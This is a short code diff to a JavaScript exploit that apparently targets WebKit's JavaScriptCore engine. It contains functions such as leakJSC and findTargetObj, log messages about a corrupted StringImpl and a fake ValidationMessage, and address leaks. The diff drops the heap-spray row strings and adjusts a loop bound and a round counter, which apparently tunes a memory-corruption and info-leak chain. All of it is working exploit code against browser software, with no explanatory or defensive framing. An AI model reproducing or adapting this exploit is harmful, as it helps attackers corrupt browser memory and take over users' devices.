@@ -36,9 +36,6 @@ var g_message_body_leak = null;
 
 var g_obj_str = {};
 
-var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
-var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
-
 var g_round = 1;
 var g_input = null;
 
@@ -194,7 +191,7 @@ function leakJSC() {
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
-	for (let i = arr_str.length - 1; i > 0; i--) {
+	for (let i = arr_str.length - 2; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
 			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
@@ -366,7 +363,7 @@ function findTargetObj() {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
-			if (g_round === 4) {
+			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
 				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
 				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
